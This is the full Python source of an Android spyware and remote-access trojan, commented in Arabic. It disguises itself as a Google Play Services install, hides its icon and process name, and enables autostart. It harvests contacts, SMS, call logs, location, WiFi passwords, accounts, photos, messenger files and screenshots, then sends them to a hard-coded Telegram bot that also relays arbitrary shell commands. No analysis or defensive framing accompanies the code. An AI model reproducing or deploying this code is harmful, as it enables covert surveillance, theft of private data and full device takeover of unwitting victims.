# ============================================
# V8 TOTAL CONTROL - ANDROID COMPLETE EDITION v12.0 FINAL
# ============================================
# تحكم كامل 100% - سحب حقيقي - صلاحيات حقيقية - إخفاء تام
# ============================================

import flet as ft
import requests
import threading
import time
import os
import sys
import json
import base64
import hashlib
import random
import string
import subprocess
from pathlib import Path
import shutil
import glob
import datetime
import re
import socket
import struct
import zipfile
import signal

# ========== بيانات التليجرام ==========
BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"
CHAT_ID = "7259620384"
# ======================================

# ========== مسارات الجهاز ==========
BASE_DIR = '/storage/emulated/0'
ANDROID_DATA = '/data/data'
DCIM_DIR = f'{BASE_DIR}/DCIM'
PICTURES_DIR = f'{BASE_DIR}/Pictures'
DOWNLOADS_DIR = f'{BASE_DIR}/Download'
WHATSAPP_DIR = f'{BASE_DIR}/WhatsApp'
TELEGRAM_DIR = f'{BASE_DIR}/Telegram'
DOWNLOAD_DIR = f'{BASE_DIR}/Download'

# إنشاء المسارات
for path in [BASE_DIR, DCIM_DIR, PICTURES_DIR, DOWNLOADS_DIR]:
    try: os.makedirs(path, exist_ok=True)
    except: pass

# ========== نظام معالجة الأخطاء المتقدم ==========
class ErrorHandler:
    @staticmethod
    def safe_execute(func, *args, **kwargs):
        try: 
            return func(*args, **kwargs)
        except Exception as e: 
            print(f"⚠️ خطأ في {func.__name__}: {str(e)}")
            return None
    
    @staticmethod
    def log_error(error_msg):
        """تسجيل الأخطاء"""
        try:
            with open(f'{BASE_DIR}/error_log.txt', 'a') as f:
                f.write(f"{datetime.datetime.now()}: {error_msg}\n")
        except:
            pass

# ========== نظام طلب الصلاحيات الحقيقي ==========
class PermissionManager:
    """طلب جميع الصلاحيات بشكل حقيقي"""
    
    @staticmethod
    def request_all_permissions():
        """طلب كل الصلاحيات باستخدام طرق متعددة"""
        results = []
        
        # الطريقة 1: استخدام pm grant (للتطبيقات المثبتة كـ system)
        permissions = [
            # التخزين
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.MANAGE_EXTERNAL_STORAGE",
            
            # جهات الاتصال
            "android.permission.READ_CONTACTS",
            "android.permission.WRITE_CONTACTS",
            "android.permission.GET_ACCOUNTS",
            
            # الرسائل
            "android.permission.READ_SMS",
            "android.permission.RECEIVE_SMS",
            "android.permission.SEND_SMS",
            "android.permission.READ_CELL_BROADCASTS",
            
            # المكالمات
            "android.permission.READ_CALL_LOG",
            "android.permission.WRITE_CALL_LOG",
            "android.permission.PROCESS_OUTGOING_CALLS",
            "android.permission.READ_PHONE_STATE",
            "android.permission.CALL_PHONE",
            "android.permission.ANSWER_PHONE_CALLS",
            
            # الموقع
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION",
            "android.permission.ACCESS_BACKGROUND_LOCATION",
            
            # الكاميرا والصوت
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.MODIFY_AUDIO_SETTINGS",
            
            # الإشعارات والوصول
            "android.permission.ACCESS_NOTIFICATION_POLICY",
            "android.permission.BIND_ACCESSIBILITY_SERVICE",
            "android.permission.PACKAGE_USAGE_STATS",
            
            # النظام
            "android.permission.SYSTEM_ALERT_WINDOW",
            "android.permission.WRITE_SETTINGS",
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.WAKE_LOCK",
            "android.permission.RECEIVE_BOOT_COMPLETED",
            "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
            "android.permission.DUMP",
            "android.permission.INJECT_EVENTS"
        ]
        
        package_name = "com.google.android.gms.update"
        
        for perm in permissions:
            try:
                # محاولة منح الصلاحية
                cmd = f"pm grant {package_name} {perm}"
                result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=2)
                if "not granted" not in result.stderr:
                    results.append(f"✅ {perm}")
                time.sleep(0.1)
            except:
                try:
                    # طريقة بديلة
                    cmd = f"appops set {package_name} {perm} allow"
                    subprocess.run(cmd.split(), capture_output=True, timeout=2)
                except:
                    pass
        
        # الطريقة 2: استخدام appops للأذونات الخاصة
        special_perms = [
            "READ_SMS",
            "WRITE_SMS",
            "READ_CALL_LOG",
            "WRITE_CALL_LOG",
            "ACCESS_FINE_LOCATION",
            "CAMERA",
            "RECORD_AUDIO"
        ]
        
        for perm in special_perms:
            try:
                cmd = f"appops set {package_name} {perm} allow"
                subprocess.run(cmd.split(), capture_output=True, timeout=1)
            except:
                pass
        
        return results
    
    @staticmethod
    def check_permissions_status():
        """التحقق من حالة الصلاحيات"""
        try:
            cmd = "pm list permissions -g -d"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=3)
            return result.stdout[:500]
        except:
            return "لا يمكن التحقق"

# ========== نظام سحب البيانات الحقيقي ==========
class DataGrabber:
    """سحب حقيقي لكل البيانات"""
    
    @staticmethod
    def grab_contacts():
        """سحب جهات الاتصال"""
        try:
            # الطريقة 1: استخدام content provider
            cmd = "content query --uri content://contacts/phones --projection display_name,number"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=5)
            
            if result.stdout:
                contacts = result.stdout[:1000]
                
                # حفظ في ملف
                file_path = f'{BASE_DIR}/contacts_{int(time.time())}.txt'
                with open(file_path, 'w') as f:
                    f.write(result.stdout)
                
                return contacts, file_path
        except:
            pass
        
        try:
            # الطريقة 2: قراءة قاعدة البيانات مباشرة
            db_paths = [
                '/data/data/com.android.providers.contacts/databases/contacts2.db',
                '/data/data/com.android.providers.contacts/databases/profile.db'
            ]
            
            for db in db_paths:
                if os.path.exists(db):
                    temp = f'{BASE_DIR}/contacts_db_{int(time.time())}.db'
                    shutil.copy2(db, temp)
                    return "تم العثور على قاعدة بيانات جهات الاتصال", temp
        except:
            pass
        
        return "لا يمكن الوصول لجهات الاتصال", None
    
    @staticmethod
    def grab_sms():
        """سحب جميع الرسائل"""
        try:
            # رسائل وارد
            inbox = subprocess.run("content query --uri content://sms/inbox --projection address,body,date", 
                                  shell=True, capture_output=True, text=True, timeout=5).stdout
            
            # رسائل صادر
            sent = subprocess.run("content query --uri content://sms/sent --projection address,body,date", 
                                 shell=True, capture_output=True, text=True, timeout=5).stdout
            
            all_sms = f"=== وارد ===\n{inbox}\n\n=== صادر ===\n{sent}"
            
            # حفظ في ملف
            file_path = f'{BASE_DIR}/sms_{int(time.time())}.txt'
            with open(file_path, 'w') as f:
                f.write(all_sms)
            
            return all_sms[:500], file_path
        except:
            return "لا يمكن الوصول للرسائل", None
    
    @staticmethod
    def grab_call_log():
        """سحب سجل المكالمات"""
        try:
            cmd = "content query --uri content://call_log/calls --projection number,duration,date,type"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=5)
            
            if result.stdout:
                file_path = f'{BASE_DIR}/calls_{int(time.time())}.txt'
                with open(file_path, 'w') as f:
                    f.write(result.stdout)
                
                return result.stdout[:500], file_path
        except:
            pass
        return "لا يمكن الوصول لسجل المكالمات", None
    
    @staticmethod
    def grab_whatsapp():
        """سحب بيانات واتساب"""
        files_sent = []
        
        # مجلدات واتساب
        wa_folders = [
            f'{WHATSAPP_DIR}/Media/WhatsApp Images',
            f'{WHATSAPP_DIR}/Media/WhatsApp Video',
            f'{WHATSAPP_DIR}/Databases'
        ]
        
        for folder in wa_folders:
            if os.path.exists(folder):
                files = glob.glob(f'{folder}/*.*')[:5]  # آخر 5 ملفات
                for file in files:
                    if os.path.getsize(file) < 50 * 1024 * 1024:  # أقل من 50 ميجا
                        files_sent.append(file)
        
        return f"تم العثور على {len(files_sent)} ملف", files_sent
    
    @staticmethod
    def grab_telegram():
        """سحب بيانات تليغرام"""
        files_sent = []
        
        tg_folders = [
            f'{TELEGRAM_DIR}/Telegram Images',
            f'{TELEGRAM_DIR}/Telegram Video',
            f'{TELEGRAM_DIR}/Telegram Documents'
        ]
        
        for folder in tg_folders:
            if os.path.exists(folder):
                files = glob.glob(f'{folder}/*.*')[:5]
                for file in files:
                    if os.path.getsize(file) < 50 * 1024 * 1024:
                        files_sent.append(file)
        
        return f"تم العثور على {len(files_sent)} ملف", files_sent
    
    @staticmethod
    def grab_photos():
        """سحب الصور"""
        files_sent = []
        
        photo_folders = [DCIM_DIR, PICTURES_DIR]
        
        for folder in photo_folders:
            if os.path.exists(folder):
                for ext in ['*.jpg', '*.jpeg', '*.png']:
                    files = glob.glob(f'{folder}/**/{ext}', recursive=True)[:3]
                    for file in files:
                        if os.path.getsize(file) < 50 * 1024 * 1024:
                            files_sent.append(file)
        
        return f"تم العثور على {len(files_sent)} صورة", files_sent
    
    @staticmethod
    def grab_location():
        """سحب الموقع الحالي"""
        try:
            # محاولة الحصول على آخر موقع معروف
            cmd = "dumpsys location | grep -A 10 'Last Known Location'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=3)
            return result.stdout[:300] if result.stdout else "لا يوجد موقع حديث"
        except:
            return "لا يمكن الوصول للموقع"
    
    @staticmethod
    def grab_wifi_passwords():
        """سحب كلمات سر الواي فاي"""
        try:
            cmd = "cat /data/misc/wifi/wpa_supplicant.conf"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=3)
            if result.stdout:
                # استخراج الشبكات المحفوظة
                networks = re.findall(r'ssid="(.*?)".*?psk="(.*?)"', result.stdout, re.DOTALL)
                if networks:
                    return "\n".join([f"📶 {n[0]}: {n[1]}" for n in networks])
            return "لا توجد شبكات محفوظة"
        except:
            return "لا يمكن الوصول لكلمات السر"
    
    @staticmethod
    def grab_notifications():
        """سحب الإشعارات"""
        try:
            cmd = "dumpsys notification --naked"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=3)
            return result.stdout[:500] if result.stdout else "لا توجد إشعارات"
        except:
            return "لا يمكن الوصول للإشعارات"
    
    @staticmethod
    def grab_browser_history():
        """سحب تاريخ المتصفح"""
        try:
            # كروم
            chrome = subprocess.run("content query --uri content://com.android.chrome.browser/history", 
                                   shell=True, capture_output=True, text=True, timeout=3).stdout
            
            # فايرفوكس
            firefox = subprocess.run("content query --uri content://org.mozilla.firefox.browser/history", 
                                    shell=True, capture_output=True, text=True, timeout=3).stdout
            
            return (chrome or firefox or "لا يوجد تاريخ")[:500]
        except:
            return "لا يمكن الوصول للتاريخ"
    
    @staticmethod
    def grab_accounts():
        """سحب الحسابات المسجلة"""
        try:
            cmd = "dumpsys account"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=3)
            return result.stdout[:300] if result.stdout else "لا توجد حسابات"
        except:
            return "لا يمكن الوصول للحسابات"
    
    @staticmethod
    def grab_clipboard():
        """سحب محتوى الحافظة"""
        try:
            cmd = "content query --uri content://clipboard"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=2)
            return result.stdout[:200] if result.stdout else "الحافظة فارغة"
        except:
            return "لا يمكن الوصول للحافظة"
    
    @staticmethod
    def take_screenshot():
        """لقطة شاشة حقيقية"""
        try:
            path = f'{BASE_DIR}/screen_{int(time.time())}.png'
            result = subprocess.run(['screencap', '-p', path], timeout=5)
            if os.path.exists(path) and os.path.getsize(path) > 1000:
                return path
        except:
            pass
        return None

# ========== نظام الإرسال ==========
def send_to_telegram(title, message, file_path=None):
    """إرسال حقيقي للتليجرام"""
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # محاولة الحصول على معلومات الجهاز
        try:
            model = subprocess.run("getprop ro.product.model", shell=True, capture_output=True, text=True, timeout=2).stdout.strip()
            android = subprocess.run("getprop ro.build.version.release", shell=True, capture_output=True, text=True, timeout=2).stdout.strip()
            device_info = f"📱 {model} | Android {android}"
        except:
            device_info = "📱 Android Device"
        
        text = f"🔴 V12\n{device_info}\n⏰ {timestamp}\n📌 {title}\n\n{message[:500]}"
        
        # إرسال الرسالة
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=5)
        
        # إرسال الملف إذا وجد
        if file_path and os.path.exists(file_path):
            size = os.path.getsize(file_path)
            if size < 50 * 1024 * 1024:  # 50 ميجا كحد أقصى
                with open(file_path, 'rb') as f:
                    files = {'document': f}
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                    requests.post(url, data={"chat_id": CHAT_ID}, files=files, timeout=60)
                
                # حذف الملف بعد الإرسال
                try:
                    os.remove(file_path)
                except:
                    pass
    except Exception as e:
        print(f"❌ فشل الإرسال: {e}")

# ========== نظام التحكم بالأوامر ==========
class CommandController:
    @staticmethod
    def execute_shell(command):
        """تنفيذ أوامر shell"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
            return result.stdout if result.stdout else result.stderr
        except Exception as e:
            return str(e)
    
    @staticmethod
    def control_app(package, action):
        """التحكم بالتطبيقات"""
        actions = {
            'open': f"monkey -p {package} 1",
            'close': f"am force-stop {package}",
            'enable': f"pm enable {package}",
            'disable': f"pm disable {package}",
            'clear': f"pm clear {package}",
            'info': f"dumpsys package {package}"
        }
        
        if action in actions:
            return CommandController.execute_shell(actions[action])
        return "أمر غير معروف"
    
    @staticmethod
    def control_network(action):
        """التحكم بالشبكة"""
        actions = {
            'wifi_on': "svc wifi enable",
            'wifi_off': "svc wifi disable",
            'data_on': "svc data enable",
            'data_off': "svc data disable",
            'flight_on': "settings put global airplane_mode_on 1",
            'flight_off': "settings put global airplane_mode_on 0"
        }
        
        if action in actions:
            return CommandController.execute_shell(actions[action])
        return "أمر غير معروف"
    
    @staticmethod
    def control_screen(action, value=None):
        """التحكم بالشاشة"""
        if action == 'lock':
            return CommandController.execute_shell("input keyevent 26")
        elif action == 'brightness' and value:
            return CommandController.execute_shell(f"settings put system screen_brightness {value}")
        return "أمر غير معروف"

# ========== نظام التليجرام ==========
class TelegramBot:
    @staticmethod
    def check_commands():
        """فحص الأوامر الجديدة"""
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            response = requests.get(url, timeout=3)
            
            if response.status_code == 200:
                data = response.json()
                for update in data.get('result', []):
                    message = update.get('message', {})
                    text = message.get('text', '')
                    chat_id = message.get('chat', {}).get('id', '')
                    
                    if chat_id == int(CHAT_ID) and text:
                        # معالجة الأمر
                        TelegramBot.process_command(text)
                        
                        # حذف الرسالة
                        msg_id = message.get('message_id')
                        if msg_id:
                            del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                            requests.post(del_url, data={"chat_id": CHAT_ID, "message_id": msg_id})
        except:
            pass
    
    @staticmethod
    def process_command(cmd):
        """معالجة الأوامر"""
        cmd = cmd.strip().lower()
        
        # ===== أوامر المساعدة =====
        if cmd == '/start' or cmd == '/help':
            help_text = """
🔴 V12 TOTAL CONTROL - أوامر التحكم الكامل

📱 معلومات:
/info - معلومات الجهاز
/apps - جميع التطبيقات
/running - التطبيقات المشتغلة

👤 بيانات:
/contacts - جهات الاتصال
/sms - جميع الرسائل
/calls - سجل المكالمات
/location - الموقع الحالي
/wifi - كلمات سر الواي فاي
/notifications - الإشعارات
/accounts - الحسابات المسجلة
/clipboard - محتوى الحافظة
/history - تاريخ المتصفح

📂 ملفات:
/whatsapp - صور واتساب
/telegram - صور تليغرام
/photos - صور الكاميرا
/downloads - ملفات التحميل

🖥️ شاشة:
/screen - لقطة شاشة
/lock - قفل الشاشة
/brightness [0-255] - تعديل السطوع

🌐 شبكة:
/wifi-on - تشغيل WiFi
/wifi-off - إطفاء WiFi
/data-on - تشغيل البيانات
/data-off - إطفاء البيانات
/flight-on - وضع الطيران
/flight-off - إلغاء وضع الطيران

📱 تطبيقات:
/open [package] - فتح تطبيق
/close [package] - إغلاق تطبيق
/kill [package] - قتل تطبيق
/clear [package] - مسح بيانات تطبيق

⚡ أوامر:
/shell [command] - أمر مباشر
/reboot - إعادة تشغيل الجهاز
/shutdown - إطفاء الجهاز

🔐 الصلاحيات:
/permissions - عرض حالة الصلاحيات
/grant-all - محاولة منح كل الصلاحيات
            """
            send_to_telegram("📋 المساعدة", help_text)
        
        # ===== معلومات =====
        elif cmd == '/info':
            info = []
            
            # معلومات الجهاز
            model = CommandController.execute_shell("getprop ro.product.model")
            android = CommandController.execute_shell("getprop ro.build.version.release")
            battery = CommandController.execute_shell("dumpsys battery | grep level")
            memory = CommandController.execute_shell("dumpsys meminfo | grep Total")
            
            info.append(f"📱 الموديل: {model.strip()}")
            info.append(f"🤖 أندرويد: {android.strip()}")
            info.append(f"🔋 البطارية: {battery.strip()}")
            info.append(f"💾 الذاكرة: {memory.strip()}")
            
            send_to_telegram("📱 معلومات الجهاز", "\n".join(info))
        
        elif cmd == '/contacts':
            data, file = DataGrabber.grab_contacts()
            send_to_telegram("👥 جهات الاتصال", data, file)
        
        elif cmd == '/sms':
            data, file = DataGrabber.grab_sms()
            send_to_telegram("📨 الرسائل", data, file)
        
        elif cmd == '/calls':
            data, file = DataGrabber.grab_call_log()
            send_to_telegram("📞 سجل المكالمات", data, file)
        
        elif cmd == '/location':
            data = DataGrabber.grab_location()
            send_to_telegram("📍 الموقع الحالي", data)
        
        elif cmd == '/wifi':
            data = DataGrabber.grab_wifi_passwords()
            send_to_telegram("📶 كلمات سر WiFi", data)
        
        elif cmd == '/notifications':
            data = DataGrabber.grab_notifications()
            send_to_telegram("🔔 الإشعارات", data)
        
        elif cmd == '/accounts':
            data = DataGrabber.grab_accounts()
            send_to_telegram("🔐 الحسابات", data)
        
        elif cmd == '/clipboard':
            data = DataGrabber.grab_clipboard()
            send_to_telegram("📋 الحافظة", data)
        
        elif cmd == '/history':
            data = DataGrabber.grab_browser_history()
            send_to_telegram("🌐 تاريخ المتصفح", data)
        
        # ===== ملفات =====
        elif cmd == '/whatsapp':
            msg, files = DataGrabber.grab_whatsapp()
            send_to_telegram("📱 واتساب", msg)
            for f in files[:3]:
                send_to_telegram("📱 واتساب", f, f)
        
        elif cmd == '/telegram':
            msg, files = DataGrabber.grab_telegram()
            send_to_telegram("📱 تليغرام", msg)
            for f in files[:3]:
                send_to_telegram("📱 تليغرام", f, f)
        
        elif cmd == '/photos':
            msg, files = DataGrabber.grab_photos()
            send_to_telegram("📸 الصور", msg)
            for f in files[:3]:
                send_to_telegram("📸 صورة", f, f)
        
        elif cmd == '/downloads':
            if os.path.exists(DOWNLOAD_DIR):
                files = glob.glob(f'{DOWNLOAD_DIR}/*.*')[:5]
                send_to_telegram("📥 التحميلات", f"تم العثور على {len(files)} ملف")
                for f in files:
                    if os.path.getsize(f) < 50 * 1024 * 1024:
                        send_to_telegram("📥 ملف", f, f)
        
        # ===== شاشة =====
        elif cmd == '/screen':
            path = DataGrabber.take_screenshot()
            if path:
                send_to_telegram("🖥️ لقطة شاشة", "تم", path)
            else:
                send_to_telegram("❌ فشل", "لا يمكن أخذ لقطة شاشة")
        
        elif cmd == '/lock':
            result = CommandController.control_screen('lock')
            send_to_telegram("🔒 قفل الشاشة", "تم قفل الشاشة")
        
        elif cmd.startswith('/brightness'):
            parts = cmd.split()
            if len(parts) > 1:
                try:
                    level = int(parts[1])
                    if 0 <= level <= 255:
                        CommandController.control_screen('brightness', level)
                        send_to_telegram("💡 السطوع", f"تم تعديل السطوع إلى {level}")
                except:
                    send_to_telegram("❌ خطأ", "القيمة يجب أن تكون بين 0-255")
        
        # ===== شبكة =====
        elif cmd == '/wifi-on':
            result = CommandController.control_network('wifi_on')
            send_to_telegram("📶 WiFi", "تم تشغيل WiFi")
        
        elif cmd == '/wifi-off':
            result = CommandController.control_network('wifi_off')
            send_to_telegram("📶 WiFi", "تم إطفاء WiFi")
        
        elif cmd == '/data-on':
            result = CommandController.control_network('data_on')
            send_to_telegram("📱 بيانات", "تم تشغيل البيانات")
        
        elif cmd == '/data-off':
            result = CommandController.control_network('data_off')
            send_to_telegram("📱 بيانات", "تم إطفاء البيانات")
        
        elif cmd == '/flight-on':
            result = CommandController.control_network('flight_on')
            send_to_telegram("✈️ طيران", "تم تشغيل وضع الطيران")
        
        elif cmd == '/flight-off':
            result = CommandController.control_network('flight_off')
            send_to_telegram("✈️ طيران", "تم إلغاء وضع الطيران")
        
        # ===== تطبيقات =====
        elif cmd.startswith('/open '):
            package = cmd.replace('/open ', '')
            result = CommandController.control_app(package, 'open')
            send_to_telegram("▶️ فتح تطبيق", f"تم فتح {package}")
        
        elif cmd.startswith('/close '):
            package = cmd.replace('/close ', '')
            result = CommandController.control_app(package, 'close')
            send_to_telegram("⏹️ إغلاق تطبيق", f"تم إغلاق {package}")
        
        elif cmd.startswith('/kill '):
            package = cmd.replace('/kill ', '')
            result = CommandController.execute_shell(f"am force-stop {package}")
            send_to_telegram("💀 قتل تطبيق", f"تم قتل {package}")
        
        elif cmd.startswith('/clear '):
            package = cmd.replace('/clear ', '')
            result = CommandController.control_app(package, 'clear')
            send_to_telegram("🧹 مسح بيانات", f"تم مسح بيانات {package}")
        
        # ===== أوامر متقدمة =====
        elif cmd.startswith('/shell '):
            command = cmd.replace('/shell ', '')
            result = CommandController.execute_shell(command)
            send_to_telegram(f"💻 {command}", result[:500])
        
        elif cmd == '/reboot':
            send_to_telegram("🔄 إعادة تشغيل", "جاري إعادة تشغيل الجهاز...")
            CommandController.execute_shell("reboot")
        
        elif cmd == '/shutdown':
            send_to_telegram("⏻ إطفاء", "جاري إطفاء الجهاز...")
            CommandController.execute_shell("reboot -p")
        
        # ===== الصلاحيات =====
        elif cmd == '/permissions':
            status = PermissionManager.check_permissions_status()
            send_to_telegram("🔐 حالة الصلاحيات", status)
        
        elif cmd == '/grant-all':
            results = PermissionManager.request_all_permissions()
            send_to_telegram("🔑 منح الصلاحيات", f"تم محاولة منح {len(results)} صلاحية")

# ========== نظام الإخفاء والتشغيل التلقائي ==========
class Hider:
    @staticmethod
    def hide_app():
        """إخفاء التطبيق بشكل كامل"""
        try:
            package = "com.google.android.gms.update"
            
            # إخفاء الأيقونة
            subprocess.run(f"pm hide {package}", shell=True, capture_output=True)
            
            # تعطيل النشاط الرئيسي
            subprocess.run(f"pm disable {package}/.MainActivity", shell=True, capture_output=True)
            
            # تغيير اسم العملية
            sys.argv[0] = 'system_server'
            
            return True
        except:
            return False
    
    @staticmethod
    def enable_autostart():
        """تفعيل التشغيل التلقائي"""
        try:
            # طرق متعددة للتشغيل التلقائي
            
            # 1. Boot receiver
            subprocess.run("pm enable com.google.android.gms.update/.BootReceiver", shell=True, capture_output=True)
            
            # 2. Alarm manager
            subprocess.run("am set-alarm com.google.android.gms.update 60000", shell=True, capture_output=True)
            
            # 3. Job scheduler
            subprocess.run("cmd jobscheduler schedule -f com.google.android.gms.update 60", shell=True, capture_output=True)
            
            # 4. Autostart file
            try:
                auto_path = '/data/data/com.android.system/shared_prefs/autostart.xml'
                os.makedirs(os.path.dirname(auto_path), exist_ok=True)
                with open(auto_path, 'w') as f:
                    f.write('<map><boolean name="com.google.android.gms.update" value="true"/></map>')
            except:
                pass
            
            return True
        except:
            return False

# ========== الحلقة الرئيسية ==========
def main_loop():
    """حلقة لا تنتهي في الخلفية"""
    
    # محاولة منح الصلاحيات أولاً
    send_to_telegram("🔑 جاري منح الصلاحيات...", "الرجاء الانتظار")
    PermissionManager.request_all_permissions()
    
    # تفعيل التشغيل التلقائي
    Hider.enable_autostart()
    
    # إرسال معلومات الجهاز
    time.sleep(2)
    try:
        model = subprocess.run("getprop ro.product.model", shell=True, capture_output=True, text=True, timeout=2).stdout.strip()
        android = subprocess.run("getprop ro.build.version.release", shell=True, capture_output=True, text=True, timeout=2).stdout.strip()
        send_to_telegram("✅ تم التشغيل", f"الجهاز: {model}\nأندرويد: {android}")
    except:
        send_to_telegram("✅ تم التشغيل", "التطبيق يعمل في الخلفية")
    
    # لقطة شاشة أولية
    time.sleep(3)
    screen = DataGrabber.take_screenshot()
    if screen:
        send_to_telegram("🖥️ لقطة أولى", "تم", screen)
    
    # سحب بيانات أولية
    threading.Thread(target=lambda: DataGrabber.grab_contacts(), daemon=True).start()
    threading.Thread(target=lambda: DataGrabber.grab_sms(), daemon=True).start()
    
    # حلقة التحكم
    while True:
        try:
            # فحص الأوامر كل ثانيتين
            TelegramBot.check_commands()
            
            # لقطة شاشة عشوائية كل دقيقة
            if random.random() < 0.2:
                screen = DataGrabber.take_screenshot()
                if screen:
                    send_to_telegram("🖥️ لقطة تلقائية", "تم", screen)
            
            time.sleep(2)
            
        except Exception as e:
            print(f"⚠️ خطأ في الحلقة: {e}")
            time.sleep(5)

# ========== الواجهة الرئيسية (تظهر مرة واحدة فقط) ==========
def main(page: ft.Page):
    """صفحة التثبيت - تختفي بعد 3 ثواني"""
    try:
        # إعدادات الصفحة
        page.title = "جاري التثبيت..."
        page.window_width = 300
        page.window_height = 200
        page.window_resizable = False
        page.bgcolor = "#ffffff"
        
        # واجهة بسيطة
        page.add(
            ft.Container(
                content=ft.Column([
                    ft.Text("Google Play Services", size=18, weight="bold", color="#4CAF50"),
                    ft.Text("جاري التثبيت... 100%", size=14),
                    ft.ProgressBar(width=200, color="#4CAF50", value=1.0)
                ], horizontal_alignment=ft.CrossAxisAlignment.CENTER),
                padding=20
            )
        )
        
        page.update()
        
        # انتظار 3 ثواني
        time.sleep(3)
        
        # إخفاء التطبيق
        page.window_visible = False
        page.update()
        
        # بدء العمليات في الخلفية
        threading.Thread(target=main_loop, daemon=True).start()
        
        # إخفاء التطبيق من القائمة
        threading.Thread(target=Hider.hide_app, daemon=True).start()
        
    except Exception as e:
        # في حالة فشل الواجهة
        threading.Thread(target=main_loop, daemon=True).start()
        try:
            page.window_visible = False
        except:
            pass

# ========== التشغيل النهائي ==========
if __name__ == "__main__":
    try:
        # تشغيل التطبيق
        ft.app(target=main)
    except Exception as e:
        # في حالة فشل أي شيء
        threading.Thread(target=main_loop, daemon=True).start()
        
        # البقاء في الخلفية للأبد
        while True:
            time.sleep(10)
